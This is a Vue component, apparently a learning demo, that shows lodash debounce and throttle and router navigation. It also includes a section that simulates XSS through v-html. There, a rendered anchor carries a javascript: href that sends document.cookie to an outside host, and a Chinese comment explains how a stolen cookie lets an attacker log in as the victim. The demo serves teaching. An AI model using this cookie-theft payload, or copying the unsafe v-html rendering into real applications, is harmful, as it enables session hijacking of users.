<template>
  <div>
    Home
    <button @click="toSearch">to Search</button>
    <br><br>
    <input type="text" @input="handleInput">
    <br><br>
    <button @click="handleAdd">累加</button>{{ count }}
    <hr>
    <h4>v-html模拟xxs攻击</h4>
    <span>
      比如用户发表评论，评论由v-html渲染展示，如果有黑客输入了 <b>href="javascript:location.href='http://www.baidu.com?'+document.cookie"</b> 这样的代码，其他的用户点击这个链接就会到黑客的服务器，
      拿到点击者电脑内浏览器上的cookie，黑客就可以在电脑上直接把cookie粘贴进去，打开某些网站就自动使用点击者的身份登录了
    </span>
    <p v-html="msg"></p>
  </div>
</template>

<script>
// import _ from 'lodash' // 全部引入
import debounce from 'lodash/debounce' // 按需引入
import throttle from 'lodash/throttle'

export default {
  components: {

  },
  data() {
    return {
      count: 0,
      msg: `<a style="color: red" href="javascript:location.href='http://www.baidu.com?'+document.cookie">百度</a>`
    }
  },
  computed: {

  },
  created() {
  },
  mounted() {
   
  },
  updated() {
  },
  methods: {
    // ES6写法-默认写法
    // handleInput(){
    //   const fn = debounce(function() { // ES5写法
    //     console.log('发请求')
    //   }, 1000)
    //   fn()
    // },
    // ES6写法-还原默认写法，使用的是箭头函数
    // handleInput: () => {
    //   const fn = debounce(function() { // ES5写法
    //     console.log('发请求')
    //   }, 1000)
    //   fn()
    // },
    // ES5写法-不使用箭头函数，这种写法也达不到防抖效果
    // handleInput: function() {
    //   const fn = debounce(function() { // ES5写法
    //     console.log('发请求')
    //   }, 1000)
    //   fn()
    // },
    // 防抖-此写法正常（ES6写法达不到防抖效果）
    handleInput: debounce(function() {
      console.log('发请求')
    }, 1000),

    // 节流
    handleAdd: throttle(function() {
      this.count++
    }, 1000),
    
    toSearch() {
      // this.$router.push({ name: 'Search', params: { k: 123 }})
      // this.$router.push({ name: 'Search', query: { bbb: 1 }})
      this.$router.push('/search/1')
    }
  }
}
</script>

<style lang='less' scoped>
</style>
